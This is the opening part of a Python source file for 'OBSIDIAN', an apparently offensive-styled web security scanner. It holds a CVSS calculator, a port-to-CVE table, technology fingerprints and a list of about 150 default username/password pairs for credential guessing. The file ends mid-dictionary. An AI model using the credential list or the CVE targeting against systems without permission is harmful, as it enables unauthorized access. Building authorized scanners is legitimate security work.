#!/usr/bin/env python3
"""
  ╔══════════════════════════════════════════════════════════════════╗
  ║   OBSIDIAN — Autonomous Web & API Security Framework             ║
  ║   Version 10.0.0  |  Codename: NIGHT REAPER                      ║
  ║   Self-Directing Decision Engine | OAST-Verified | Profiles      ║
  ║   OWASP Web Top 10 + API Top 10 | MITRE ATT&CK | CVSS v3.1       ║
  ║   150+ Modules | Plugin Architecture | Zero-FP (<5%)             ║
  ║   Detection & Reporting Only — Authorized Testing Only           ║
  ╚══════════════════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────────────────────────────────────
# IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import sys, os, re, json, time, socket, hashlib, argparse, shutil, subprocess
import warnings, threading, random, platform, base64, math, ipaddress
from datetime import datetime
from urllib.parse import (urlparse, urljoin, quote, urlencode,
                           parse_qs, urlunparse)
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

warnings.filterwarnings("ignore")

# ─────────────────────────────────────────────────────────────────────────────
# Strip ANSI colour automatically when output is piped/redirected (not a TTY),
# so logs and reports written to files are clean. Interactive terminals keep colour.
# Override with OBSIDIAN_FORCE_COLOR=1.
# ─────────────────────────────────────────────────────────────────────────────
class _AnsiStripWriter:
    _ANSI = re.compile(r"\x1b\[[0-9;]*m")
    def __init__(self, stream): self._s = stream
    def write(self, data):
        try: return self._s.write(self._ANSI.sub("", data) if isinstance(data, str) else data)
        except Exception: return self._s.write(data)
    def flush(self):
        try: self._s.flush()
        except Exception: pass
    def __getattr__(self, name): return getattr(self._s, name)

if (not getattr(sys.stdout, "isatty", lambda: False)()
        and not os.environ.get("OBSIDIAN_FORCE_COLOR")
        and not isinstance(sys.stdout, _AnsiStripWriter)):
    sys.stdout = _AnsiStripWriter(sys.stdout)

# ─────────────────────────────────────────────────────────────────────────────
# BOOTSTRAP
# ─────────────────────────────────────────────────────────────────────────────
def _pip(pkg):
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", pkg, "-q"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    import requests; requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[*] Installing requests..."); _pip("requests")
    import requests; requests.packages.urllib3.disable_warnings()

# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
VERSION   = "10.1.1"
TOOL_NAME = "OBSIDIAN"
WORK_DIR  = Path("obs_workspace")
TOOLS_DIR = Path("obs_tools")
TIMEOUT   = 10
MAX_CRAWL = 30
MAX_PARAMS= 8
THREADS   = 5
DEFAULT_UA= f"Obsidian/{VERSION} (Authorized Security Assessment)"

# ─────────────────────────────────────────────────────────────────────────────
# EXTENDED PATH  (fixes go/pip binary detection)
# ─────────────────────────────────────────────────────────────────────────────
def _build_path() -> str:
    extra = [
        str(Path.home()/"go"/"bin"), "/usr/local/go/bin", "/go/bin",
        str(Path(os.environ.get("GOPATH",str(Path.home()/"go")))/"bin"),
        str(Path.home()/".local"/"bin"),
        str(Path(sys.prefix)/"bin"),
        str(Path(sys.executable).parent),
        "/usr/local/bin", "/usr/bin",
        str(Path.home()/".gem"/"bin"),
    ]
    cur  = os.environ.get("PATH","")
    all_ = cur.split(os.pathsep) + [p for p in extra if p not in cur]
    return os.pathsep.join(all_)

_EXT_PATH = _build_path()
os.environ["PATH"] = _EXT_PATH

def cmd_exists(n): return bool(shutil.which(n, path=_EXT_PATH))
def find_bin(n):   return shutil.which(n, path=_EXT_PATH)

# ─────────────────────────────────────────────────────────────────────────────
# CVSS v3.1 ENGINE + NVD DB + CREDENTIALS DB + TECH SIGNATURES
# ─────────────────────────────────────────────────────────────────────────────
class CVSS31:
    AV={"N":0.85,"A":0.62,"L":0.55,"P":0.20}
    AC={"L":0.77,"H":0.44}
    PR={"N":0.85,"L":0.62,"H":0.27}
    PR_C={"N":0.85,"L":0.68,"H":0.50}
    UI={"N":0.85,"R":0.62}
    CIA={"N":0.00,"L":0.22,"H":0.56}
    @classmethod
    def score(cls,av="N",ac="L",pr="N",ui="N",s="U",c="N",i="N",a="N"):
        import math
        av_v=cls.AV.get(av,0.85); ac_v=cls.AC.get(ac,0.77)
        pr_v=(cls.PR_C if s=="C" else cls.PR).get(pr,0.85); ui_v=cls.UI.get(ui,0.85)
        c_v=cls.CIA.get(c,0.00); i_v=cls.CIA.get(i,0.00); a_v=cls.CIA.get(a,0.00)
        iss=1.0-(1-c_v)*(1-i_v)*(1-a_v)
        impact=(6.42*iss if s=="U" else 7.52*(iss-0.029)-3.25*(iss-0.02)**15)
        exploit=8.22*av_v*ac_v*pr_v*ui_v
        if impact<=0: base=0.0
        else: base=(min(impact+exploit,10) if s=="U" else min(1.08*(impact+exploit),10))
        base=math.ceil(base*10)/10
        rating=("Critical" if base>=9.0 else "High" if base>=7.0 else "Medium" if base>=4.0 else "Low" if base>0.0 else "None")
        return round(base,1), f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}", rating
    PRESETS={
        "xss":("N","L","N","R","U","L","N","N"),"sqli":("N","L","N","N","U","H","H","N"),
        "ssrf":("N","L","N","N","U","H","L","N"),"lfi":("N","L","N","N","C","H","N","N"),
        "rfi":("N","L","N","N","C","H","H","H"),"ssti":("N","L","N","N","C","H","H","H"),
        "xxe":("N","L","N","N","U","H","N","N"),"nosqli":("N","L","N","N","U","H","H","N"),
        "csrf":("N","L","N","R","U","N","L","N"),"cors":("N","L","N","N","U","H","N","N"),
        "crlf":("N","L","N","N","U","N","L","N"),"open_redirect":("N","L","N","R","U","N","L","N"),
        "clickjacking":("N","L","N","R","U","N","L","N"),"idor":("N","L","L","N","U","H","N","N"),
        "jwt":("N","L","N","N","U","H","H","N"),"file_upload":("N","L","N","N","C","H","H","H"),
        "default_creds":("N","L","N","N","U","H","H","H"),"session_fix":("N","L","N","R","U","H","H","N"),
        "cmd_injection":("N","L","N","N","C","H","H","H"),"deserialization":("N","L","N","N","U","H","H","H"),
        "prototype_poll":("N","L","N","N","C","H","H","H"),"rate_limit":("N","L","N","N","U","N","L","N"),
        "info_disclosure":("N","L","N","N","U","L","N","N"),"sensitive_files":("N","L","N","N","U","H","N","N"),
        "secrets":("N","L","N","N","U","H","N","N"),"403_bypass":("N","L","N","N","U","H","H","N"),
        "smtp_relay":("N","L","N","N","U","N","H","N"),"host_header":("N","L","N","N","U","L","L","N"),
        "cache_poison":("N","L","N","N","U","L","L","N"),"spf_dmarc":("N","L","N","N","U","N","L","N"),
        "webdav":("N","L","N","N","U","H","H","N"),"graphql":("N","L","N","N","U","L","N","N"),
        "recon":("N","L","N","N","U","N","N","N"),"ssl":("N","H","N","N","U","H","N","N"),
        "headers":("N","L","N","N","U","N","L","N"),"cookies":("N","L","N","R","U","L","N","N"),
        "xpath_injection":("N","L","N","N","U","H","H","N"),"ssi_injection":("N","L","N","N","C","H","H","H"),
        "log_injection":("N","L","N","N","U","N","L","N"),"smtp_relay":("N","L","N","N","U","N","H","N"),
        "rfi":("N","L","N","N","C","H","H","H"),"webdav":("N","L","N","N","U","H","H","N"),
        "blind_xss":("N","L","N","R","U","L","N","N"),"cmd_blind":("N","L","N","N","C","H","H","H"),
    }
    @classmethod
    def for_module(cls,key):
        p=cls.PRESETS.get(key)
        return cls.score(*p) if p else cls.score("N","L","N","N","U","L","N","N")

PORT_CVE_DB = {
    21:[("CVE-2015-3306","ProFTPD mod_copy RCE",9.8),("CVE-2011-2523","vsftpd 2.3.4 backdoor",10.0)],
    22:[("CVE-2023-38408","OpenSSH agent RCE",9.8),("CVE-2018-15473","Username enumeration",5.3)],
    23:[("CVE-2020-10188","Telnet cleartext",9.8)],
    25:[("CVE-2020-7247","OpenSMTPD RCE",10.0),("CVE-2019-10149","Exim RCE",9.8)],
    80:[("CVE-2021-41773","Apache path traversal",7.5),("CVE-2021-42013","Apache RCE",9.8)],
    110:[("CVE-2020-12828","Cyrus IMAPD overflow",9.8)],
    135:[("CVE-2003-0352","MS-RPC DCOM RCE Blaster",10.0)],
    139:[("CVE-2017-0144","EternalBlue SMB RCE",9.8)],
    143:[("CVE-2021-38704","Dovecot IMAP disclosure",5.3)],
    443:[("CVE-2014-0160","Heartbleed",7.5),("CVE-2022-22965","Spring4Shell RCE",9.8)],
    445:[("CVE-2017-0144","EternalBlue WannaCry RCE",9.8),("CVE-2020-0796","SMBGhost RCE",10.0)],
    1433:[("CVE-2020-0618","MSSQL RCE",8.8)],
    1521:[("CVE-2012-1675","Oracle TNS Listener poison",7.5)],
    2375:[("CVE-2019-5736","Docker daemon RCE",8.6)],
    3306:[("CVE-2012-2122","MySQL auth bypass",7.5)],
    3389:[("CVE-2019-0708","BlueKeep RDP RCE",9.8),("CVE-2019-1181","DejaBlue RDP RCE",9.8)],
    5432:[("CVE-2019-9193","PostgreSQL COPY RCE",8.8)],
    5900:[("CVE-2019-15681","LibVNCServer memory leak",7.5)],
    6379:[("CVE-2022-0543","Redis Lua sandbox escape",10.0)],
    7001:[("CVE-2020-14882","WebLogic RCE",9.8),("CVE-2021-2109","WebLogic RCE",7.2)],
    8080:[("CVE-2020-1938","Ghostcat Tomcat",9.8)],
    8443:[("CVE-2021-22005","VMware vCenter RCE",9.8)],
    9200:[("CVE-2015-1427","Elasticsearch Groovy RCE",9.8)],
    11211:[("CVE-2018-1000115","Memcached amplification",8.6)],
    27017:[("CVE-2013-2132","MongoDB no-auth default",9.8)],
}

DEFAULT_CREDS_DB = [
    ("admin","admin"),("admin","password"),("admin","admin123"),("admin","1234"),
    ("admin","12345"),("admin","123456"),("admin","password123"),("admin","pass"),
    ("admin","admin@123"),("admin","P@ssw0rd"),("admin","letmein"),("admin","welcome"),
    ("admin","qwerty"),("admin","abc123"),("admin","root"),("admin","test"),
    ("admin","changeme"),("admin","default"),("admin","master"),("admin","secret"),
    ("admin",""),("admin","Admin123"),("admin","Admin@123"),("admin","Admin@2024"),
    ("admin","Summer2024"),("admin","Winter2024"),("admin","Password1"),
    ("admin","Passw0rd"),("admin","Pass@123"),("admin","pass@123"),
    ("admin","000000"),("admin","111111"),("admin","123123"),("admin","qwerty123"),
    ("admin","admin2023"),("admin","admin2024"),("admin","Company123"),
    ("admin","Welcome1"),("admin","welcome1"),("admin","admin1"),("admin","test1"),
    ("root","root"),("root","toor"),("root","password"),("root","root123"),
    ("root","1234"),("root","admin"),("root","P@ssw0rd"),("root",""),
    ("user","user"),("user","user123"),("user","password"),("user","1234"),
    ("test","test"),("test","test123"),("test","password"),("test","1234"),
    ("guest","guest"),("guest",""),("guest","password"),("guest","1234"),
    ("demo","demo"),("demo","password"),("demo","demo123"),
    ("administrator","administrator"),("administrator","password"),
    ("administrator","1234"),("administrator","admin"),("administrator","P@ssword1"),
    ("admin","wordpress"),("admin","joomla"),("admin","drupal"),("admin","magento"),
    ("sa",""),("sa","sa"),("oracle","oracle"),("postgres","postgres"),
    ("postgres","password"),("mysql","mysql"),("redis",""),("redis","redis"),
    ("elasticsearch",""),("elastic","elastic"),("kibana","kibana"),
    ("grafana","admin"),("jenkins","jenkins"),("jenkins","password"),
    ("tomcat","tomcat"),("tomcat","s3cret"),("manager","manager"),
    ("deployer","deployer"),("hadoop","hadoop"),("spark","spark"),
    ("minio","minioadmin"),("consul","consul"),("vault","vault"),
    ("gitlab","gitlab"),("git","git"),("nagios","nagios"),("zabbix","zabbix"),
    ("sonar","admin"),("nexus","admin123"),("nexus","nexus"),
    ("cisco","cisco"),("enable","enable"),("ubnt","ubnt"),("pi","raspberry"),
    ("sysadmin","sysadmin"),("superadmin","superadmin"),("webmaster","webmaster"),
    ("dev","dev"),("developer","developer"),("deploy","deploy"),
    ("staging","staging"),("qa","qa"),("ftpuser","ftpuser"),("ftp","ftp"),
    ("backup","backup"),("backup","backup123"),("mail","mail"),("smtp","smtp"),
    ("monitor","monitor"),("scan","scan"),("audit","audit"),
    ("readonly","readonly"),("viewer","viewer"),("support","support"),
    ("operator","operator"),("info","info"),("postmaster","postmaster"),
]

TECH_SIGNATURES = {
    "WordPress":{"body":["wp-content","wp-includes","wp-json"],"hdrs":["X-Pingback"],"cookie":["wordpress_"]},
    "Joomla":{"body":["joomla","com_content","option=com_"]},
    "Drupal":{"body":["drupal","sites/all","Drupal.settings"],"hdrs":["X-Drupal-Cache"]},
    "Magento":{"body":["mage/cookies","skin/frontend/"],"cookie":["frontend","adminhtml"]},
    "Shopify":{"body":["cdn.shopify.com","Shopify.theme"],"hdrs":["X-ShopId"]},
    "WooCommerce":{"body":["woocommerce","WC_AJAX"]},
    "PrestaShop":{"body":["prestashop"],"cookie":["PrestaShop"]},
    "OpenCart":{"body":["route=common","catalog/view/theme"]},
    "TYPO3":{"body":["typo3","TYPO3"]},
    "Squarespace":{"body":["squarespace.com"]},
    "Wix":{"body":["wix.com","_wixCIDX"],"cookie":["svSession"]},
    "Ghost":{"body":["ghost.io","content/themes"]},
    "Webflow":{"body":["webflow.com","wf-form"]},
    "Laravel":{"body":["laravel_session","XSRF-TOKEN"],"cookie":["laravel_session"]},
    "Django":{"body":["csrfmiddlewaretoken"],"cookie":["csrftoken"]},
    "Flask":{"hdrs":["Server: Werkzeug"]},
    "Ruby on Rails":{"body":["authenticity_token"],"hdrs":["X-Runtime"]},
    "Spring Boot":{"body":["Whitelabel Error Page"],"hdrs":["X-Application-Context"]},
    "ASP.NET":{"body":["__VIEWSTATE","__EVENTVALIDATION"],"hdrs":["X-AspNet-Version"]},
    "Angular":{"body":["ng-version","ng-app","angular.min.js"]},
    "React":{"body":["_reactRootContainer","__REACT_DEVTOOLS"]},
    "Next.js":{"body":["__NEXT_DATA__","/_next/static"]},
    "Vue.js":{"body":["vue.min.js","__vue__"]},
    "Nuxt.js":{"body":["__nuxt","_nuxt/"]},
    "Svelte":{"body":["__svelte"]},
    "Express.js":{"hdrs":["X-Powered-By: Express"]},
    "Symfony":{"body":["sf_redirect","symfony/profiler"]},
    "CodeIgniter":{"body":["CodeIgniter"],"cookie":["ci_session"]},
    "CakePHP":{"body":["cakephp"],"cookie":["CAKEPHP"]},
    "FastAPI":{"body":["FastAPI"],"hdrs":["Server: uvicorn"]},
    "NestJS":{"body":["NestJS"]},
    "Strapi":{"body":["strapi"]},
    "Apache":{"hdrs":["Server: Apache"]},
    "Nginx":{"hdrs":["Server: nginx"]},
    "IIS":{"hdrs":["Server: Microsoft-IIS"]},
    "LiteSpeed":{"hdrs":["Server: LiteSpeed"]},
    "Tomcat":{"hdrs":["Server: Apache-Coyote"],"body":["Apache Tomcat"]},
    "WebLogic":{"body":["WebLogic Server"]},
    "WebSphere":{"body":["IBM WebSphere"]},
    "PHP":{"hdrs":["X-Powered-By: PHP"]},
    "Cloudflare":{"hdrs":["CF-Ray","CF-Cache-Status"],"cookie":["cf_clearance"]},
    "Akamai":{"hdrs":["X-Akamai-Session-Info"]},
    "Fastly":{"hdrs":["X-Fastly-Request-ID"]},
    "AWS CloudFront":{"hdrs":["X-Amz-Cf-Id"]},
    "AWS ALB":{"cookie":["AWSALB"]},
    "Varnish":{"hdrs":["X-Varnish","Via: varnish"]},
    "Imperva":{"hdrs":["X-Iinfo"],"cookie":["visid_incap"]},
    "F5 BIG-IP":{"hdrs":["Server: BigIP"],"cookie":["BIGipServer"]},
    "Google Analytics":{"body":["google-analytics.com","gtag/js"]},
    "Google Tag Manager":{"body":["googletagmanager.com","GTM-"]},
    "Hotjar":{"body":["hotjar.com"]},
    "Intercom":{"body":["intercomcdn.com"]},
    "HubSpot":{"cookie":["hubspotutk"]},
    "Sentry":{"body":["sentry.io","Sentry.init"]},
    "Datadog":{"body":["datadoghq.com"]},
    "New Relic":{"body":["NREUM"]},
    "Elasticsearch":{"body":["elasticsearch"]},
    "Grafana":{"body":["app/grafana"]},
    "Prometheus":{"body":["prometheus_","HELP prometheus"]},
    "Stripe":{"body":["stripe.com/v3"]},
    "PayPal":{"body":["paypalobjects.com"]},
    "Bootstrap":{"body":["bootstrap.min.css"]},
    "Tailwind CSS":{"body":["tailwindcss"]},
    "jQuery":{"body":["jquery.min.js","jQuery("]},
    "Auth0":{"body":["auth0.com"]},
    "Okta":{"body":["okta.com","OktaSignIn"]},
    "Keycloak":{"body":["Keycloak","auth/realms"]},
    "SAML":{"body":["SAMLRequest","SAMLResponse"]},
    "Swagger UI":{"body":["swagger-ui","SwaggerUIBundle"]},
    "GraphQL":{"body":["__schema","__typename"]},
    "Socket.io":{"body":["socket.io"]},
    "Webpack":{"body":["__webpack_require__"]},
    "Vite":{"body":["@vite/"]},
    "MySQL":{"body":["mysql_fetch","mysqli"]},
    "PostgreSQL":{"body":["PSQLException"]},
    "MongoDB":{"body":["MongoError"]},
    "Redis":{"body":["redis_version"]},
    "Oracle DB":{"body":["ORA-","oracle.jdbc"]},
    "MSSQL":{"body":["SqlException","Microsoft SQL"]},
    "GitLab":{"body":["gitlab"],"hdrs":["X-Gitlab-Meta"]},
    "Jira":{"body":["atlassian","JIRA"]},
    "Confluence":{"body":["confluence","atlassian"]},
    "Salesforce":{"body":["force.com","salesforce.com"]},
    "Zendesk":{"body":["zendesk.com"]},
    "Zoho":{"body":["zoho.com"]},
}

# ─────────────────────────────────────────────────────────────────────────────
# COLOURS
# ─────────────────────────────────────────────────────────────────────────────
E = "\033["
class C:
    PUR=E+"95m"; GRN=E+"92m"; WHT=E+"97m"; RED=E+"91m"
    CYN=E+"96m"; YLW=E+"93m"; BLU=E+"94m"; DIM=E+"2m"
    BLD=E+"1m";  UND=E+"4m";  RST=E+"0m";  BG_RED=E+"41m"
    p  = staticmethod(lambda t: f"{E}95m{E}1m{t}{E}0m")
    g  = staticmethod(lambda t: f"{E}92m{t}{E}0m")
    r  = staticmethod(lambda t: f"{E}91m{E}1m{t}{E}0m")
    y  = staticmethod(lambda t: f"{E}93m{t}{E}0m")
    d  = staticmethod(lambda t: f"{E}2m{t}{E}0m")
    critical = staticmethod(lambda t: f"{E}91m{E}1m{t}{E}0m")
    high     = staticmethod(lambda t: f"{E}91m{t}{E}0m")
    medium   = staticmethod(lambda t: f"{E}93m{t}{E}0m")
    low      = staticmethod(lambda t: f"{E}92m{t}{E}0m")
    info     = staticmethod(lambda t: f"{E}96m{t}{E}0m")

def clr(): os.system("cls" if os.name=="nt" else "clear")

# ─────────────────────────────────────────────────────────────────────────────
# ASCII ART / BANNER
# ─────────────────────────────────────────────────────────────────────────────
SKULL_ART = r"""
                         ██████████████
                    ████████████████████████
                 ██████████████████████████████
               ██████████████████████████████████
              ████████████████████████████████████
             ██████████████████████████████████████
            ████████████████████████████████████████
            ████████      ████████      ████████████
            ███████        ██████        ███████████
            ███████  ████  ██████  ████  ███████████
            ███████  ████  ██████  ████  ███████████
            ████████      ████████      ████████████
            ████████████████████████████████████████
             ██████████████████████████████████████
              ████████████████████████████████████
               ████████  ██████████  ████████████
                ████████            ████████████
                 ██████████████████████████████
                   ████    ████████    ████
                     ██  ██  ████  ██  ██
                      ████    ██    ████
                        ██████████████
"""

DD_LOGO = r"""
   ██████╗ ██████╗ ███████╗██╗██████╗ ██╗ █████╗ ███╗   ██╗
  ██╔═══██╗██╔══██╗██╔════╝██║██╔══██╗██║██╔══██╗████╗  ██║
  ██║   ██║██████╔╝███████╗██║██║  ██║██║███████║██╔██╗ ██║
  ██║   ██║██╔══██╗╚════██║██║██║  ██║██║██╔══██║██║╚██╗██║
  ╚██████╔╝██████╔╝███████║██║██████╔╝██║██║  ██║██║ ╚████║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
"""

VERSION_LINE = f"  ▸ v{VERSION}  ·  NIGHT REAPER  ·  Autonomous Decision Engine  ·  Zero-FP (<5%)"
SUBTITLE     = "  ▸ OWASP Web+API Top 10  ·  MITRE ATT&CK  ·  CVSS v3.1  ·  OAST Verified  ·  Self-Directing"

TAGLINES = [
    "  ☠  WHERE SYSTEMS CONFESS THEIR SINS  ☠",
    "  ☠  PRECISION IS POWER — ZERO FALSE POSITIVES  ☠",
    "  ☠  THE DARK FINDS WHAT THE LIGHT REFUSES TO SEE  ☠",
    "  ☠  EVERY API HAS A SECRET. EVERY SECRET HAS A COST.  ☠",
    "  ☠  NIGHT REAPER: SILENT ENTRY. TOTAL VISIBILITY.  ☠",
    "  ☠  NOT A TOOL. A WEAPON FOR THE AUTHORIZED.  ☠",
]
QUOTES = [
    '"The quieter you become, the more you can hear."  — RAM',
    '"Security is a process, not a product."  — Bruce Schneier',
    '"Offense informs defense."  — Bug Bounty Proverb',
    '"Know thy enemy and know thyself."  — Sun Tzu',
    '"In the world of zeros and ones, the devil lives in the details."',
    '"A false positive is a wasted exploit. Precision is power."',
    '"The best defense is a well-informed offense."  — OWASP',
    '"Hack the planet. Responsibly."',
]
GLITCH = "!@#$%^&*<>?|[]{}~`ΔΨΩ▓▒░█▀▄■□ξζη"

# ─────────────────────────────────────────────────────────────────────────────
# ANIMATION
# ─────────────────────────────────────────────────────────────────────────────
def typewrite(text, speed=0.014, color=""):
    for ch in text:
        sys.stdout.write(f"{color}{ch}{C.RST if color else ''}"); sys.stdout.flush(); time.sleep(speed)
    print()

def glitch_print(text, iters=4):
    for _ in range(iters):
        g = "".join(random.choice(GLITCH) if random.random()<0.10 and ch not in " |╔╗╚╝═║" else ch for ch in text)
        sys.stdout.write(f"\r{C.PUR}{C.BLD}{g}{C.RST}"); sys.stdout.flush(); time.sleep(0.06)
    sys.stdout.write(f"\r{C.PUR}{C.BLD}{text}{C.RST}\n"); sys.stdout.flush()

_spin_lock = threading.Lock()
def spinner_task(msg, stop_ev, color=C.PUR):
    fr = list("⣾⣽⣻⢿⡿⣟⣯⣷"); i=0
    while not stop_ev.is_set():
        with _spin_lock:
            sys.stdout.write(f"\r  {color}{fr[i%8]}{C.RST}  {C.WHT}{msg}{C.RST}   "); sys.stdout.flush()
        time.sleep(0.08); i+=1
    with _spin_lock:
        sys.stdout.write(f"\r  {C.GRN}✔{C.RST}  {C.WHT}{msg}{C.RST}          \n"); sys.stdout.flush()

def progress_bar(label, total, current, width=36):
    filled = int(width*current/max(total,1))
    bar = f"{C.GRN}{'█'*filled}{C.PUR}{'░'*(width-filled)}{C.RST}"
    sys.stdout.write(f"\r  {C.WHT}{label:<26}{C.RST}[{bar}] {C.GRN}{int(100*current/max(total,1)):3d}%{C.RST} ")
    sys.stdout.flush()

def matrix_rain(lines=4):
    w = min(shutil.get_terminal_size((80,24)).columns,100)
    chars = "ΔΨΩ01αβγδ▓▒░█▀■□◆○●ξζηθ01"
    cols  = [C.GRN,C.PUR,C.CYN,C.WHT+C.DIM,C.DIM]
    for _ in range(lines):
        print("".join(f"{random.choice(cols)}{random.choice(chars)}{C.RST}" if random.random()>0.4 else " " for _ in range(w)))
        time.sleep(0.04)

def pulse_line(text="", color=C.PUR):
    w = min(shutil.get_terminal_size((80,24)).columns-4, 76)
    print(f"  {color}{'━'*w}{C.RST}")
    if text:
        print(f"  {color}{C.BLD}  {text}{C.RST}")
        print(f"  {color}{'━'*w}{C.RST}")

def show_banner():
    clr()
    w = min(shutil.get_terminal_size((100,24)).columns, 110)

    # ── Top border ────────────────────────────────────────────────────────
    print(f"  {C.RED}{'━'*min(w-4, 78)}{C.RST}")
    print()

    # ── Skull art — red/purple gradient ───────────────────────────────────
    skull_lines = SKULL_ART.strip().split("\n")
    colors = [C.RED, C.RED+C.BLD, C.PUR+C.BLD, C.PUR, C.RED+C.BLD, C.PUR]
    for i, line in enumerate(skull_lines):
        col = colors[i % len(colors)]
        print(f"  {col}{line}{C.RST}")
        time.sleep(0.015)
    print()

    # ── Logo — alternating red/purple on block chars ──────────────────────
    for line in DD_LOGO.strip().split("\n"):
        out = ""
        toggle = True
        for ch in line:
            if ch in "█║╗╝╚╔╠╣═─│╗╝":
                out += f"{C.RED+C.BLD if toggle else C.PUR+C.BLD}{ch}"
                toggle = not toggle
            else:
                out += f"{C.WHT}{ch}"
        print(f"{out}{C.RST}")
    print()

    # ── Version + Subtitle ────────────────────────────────────────────────
    print(f"  {C.RED}{C.BLD}{VERSION_LINE}{C.RST}")
    print(f"  {C.PUR}{SUBTITLE}{C.RST}")
    print()

    # ── Tagline with glitch effect ────────────────────────────────────────
    glitch_print(random.choice(TAGLINES))
    print(f"  {C.DIM}{random.choice(QUOTES)}{C.RST}")
    print()

    # ── Warning bar ───────────────────────────────────────────────────────
    w2  = min(shutil.get_terminal_size((80,24)).columns - 2, 82)
    msg = "  ⚠  FOR AUTHORIZED SECURITY TESTING ONLY — OBTAIN WRITTEN PERMISSION FIRST  ⚠"
    print(f"  {C.BG_RED}{C.WHT}{C.BLD}{msg[:w2]}{C.RST}")
    print(f"  {C.RED}{'━'*min(w-4, 78)}{C.RST}")
    print()


def menu_divider(char="═", color=C.PUR):
    w = min(shutil.get_terminal_size((80,24)).columns-4, 76)
    print(f"  {color}{char*w}{C.RST}")

def menu_title(text):
    menu_divider(); pad=max(0,(76-len(text))//2)
    print(f"  {C.PUR}║{' '*pad}{C.WHT}{C.BLD}{text}{C.RST}{C.PUR}{' '*pad}║{C.RST}")
    menu_divider(); print()

def menu_option(num, icon, title, desc):
    print(f"  {C.PUR}┃{C.RST}  {C.GRN}{C.BLD} [{num}] {C.RST} {C.WHT}{C.BLD}{icon}  {title}{C.RST}")
    print(f"  {C.PUR}┃{C.RST}         {C.DIM}{desc}{C.RST}")
    print(f"  {C.PUR}┃{C.RST}")

def prompt(text, color=C.PUR):
    try: return input(f"  {color}{C.BLD}{text}{C.RST} ").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n\n  {C.YLW}[!] Interrupted.{C.RST}\n"); sys.exit(0)

def show_main_menu():
    menu_title("☠  OBSIDIAN v10.0 — NIGHT REAPER — SELECT MODE  ☠")
    menu_option("1","💀","SCANNER MODE",
                "Full scan: OWASP+API Top 10 | MITRE ATT&CK | 100+ modules | CVSS v3.1 | Zero-FP (<5%)")
    menu_option("2","🏢","ENTERPRISE TOOLS",
                "ZAP | OpenVAS | Nessus | Acunetix | Burp Suite | Qualys | Semgrep | +8 more")
    menu_option("0","✖ ","EXIT","Close OBSIDIAN")
    menu_divider("─",C.DIM); print()
    return prompt("  ┗━━► CHOOSE MODE :",C.PUR)

# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# OWASP WEB TOP 10 (2021) + API SECURITY TOP 10 (2023) + MITRE ATT&CK MAPPING
# ─────────────────────────────────────────────────────────────────────────────
OWASP_MITRE = {
    # ── Web Application Top 10 ───────────────────────────────────────────────
    "recon"            : ("A05","Security Misconfiguration",      "T1595","Active Scanning"),
    "headers"          : ("A05","Security Misconfiguration",      "T1071","Application Layer Protocol"),
    "ssl"              : ("A02","Cryptographic Failures",         "T1040","Network Sniffing"),
    "cookies"          : ("A07","Auth & Session Failures",        "T1539","Steal Web Session Cookie"),
    "cors"             : ("A05","Security Misconfiguration",      "T1071","Application Layer Protocol"),
    "csrf"             : ("A01","Broken Access Control",          "T1204","User Execution"),
    "clickjacking"     : ("A05","Security Misconfiguration",      "T1204","User Execution"),
    "open_redirect"    : ("A01","Broken Access Control",          "T1071","Application Layer Protocol"),
    "http_methods"     : ("A05","Security Misconfiguration",      "T1190","Exploit Public-Facing App"),
    "host_header"      : ("A03","Injection",                      "T1071","Application Layer Protocol"),
    "info_disclosure"  : ("A05","Security Misconfiguration",      "T1213","Data from Information Repos"),
    "sensitive_files"  : ("A05","Security Misconfiguration",      "T1552","Unsecured Credentials"),
    "secrets"          : ("A02","Cryptographic Failures",         "T1552","Unsecured Credentials"),
    "xss"              : ("A03","Injection",                      "T1059.007","JavaScript"),
    "sqli"             : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "lfi"              : ("A01","Broken Access Control",          "T1083","File & Dir Discovery"),
    "ssti"             : ("A03","Injection",                      "T1059","Command & Script Interpreter"),
    "ssrf"             : ("A10","Server-Side Request Forgery",    "T1090","Proxy"),
    "crlf"             : ("A03","Injection",                      "T1071","Application Layer Protocol"),
    "xxe"              : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "graphql"          : ("A05","Security Misconfiguration",      "T1213","Data from Information Repos"),
    "jwt"              : ("A07","Auth & Session Failures",        "T1539","Steal Web Session Cookie"),
    "nosqli"           : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "waf"              : ("A05","Security Misconfiguration",      "T1027","Obfuscated Files or Info"),
    "403_bypass"       : ("A01","Broken Access Control",          "T1190","Exploit Public-Facing App"),
    "idor"             : ("A01","Broken Access Control",          "T1078","Valid Accounts"),
    "default_creds"    : ("A07","Auth & Session Failures",        "T1078","Valid Accounts"),
    "session_fix"      : ("A07","Auth & Session Failures",        "T1539","Steal Web Session Cookie"),
    "mass_assign"      : ("A04","Insecure Design",                "T1190","Exploit Public-Facing App"),
    "components"       : ("A06","Vulnerable Components",          "T1195","Supply Chain Compromise"),
    "sri"              : ("A08","Data Integrity Failures",        "T1195","Supply Chain Compromise"),
    "rate_limit"       : ("A07","Auth & Session Failures",        "T1110","Brute Force"),
    "ldap_injection"   : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "email_injection"  : ("A03","Injection",                      "T1566","Phishing"),
    "hpp"              : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "cache_poison"     : ("A05","Security Misconfiguration",      "T1557","Adversary-in-the-Middle"),
    "file_upload"      : ("A04","Insecure Design",                "T1505.003","Web Shell"),
    "oauth_oidc"       : ("A07","Auth & Session Failures",        "T1078","Valid Accounts"),
    "api_security"     : ("A01","Broken Access Control",          "T1078","Valid Accounts"),
